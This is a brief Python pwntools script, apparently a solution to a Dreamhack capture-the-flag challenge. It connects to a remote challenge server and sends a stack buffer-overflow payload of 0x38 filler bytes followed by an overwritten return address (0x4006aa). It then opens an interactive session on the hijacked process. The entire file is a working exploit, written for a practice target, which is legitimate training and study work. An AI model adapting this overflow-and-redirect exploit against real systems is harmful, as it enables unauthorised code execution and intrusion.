from pwn import *

p = remote("host3.dreamhack.games", 22169)

addr = 0x4006aa
addr = p64(addr)
payload = b"A"*0x38
payload += addr

p.sendline(payload)

p.interactive()
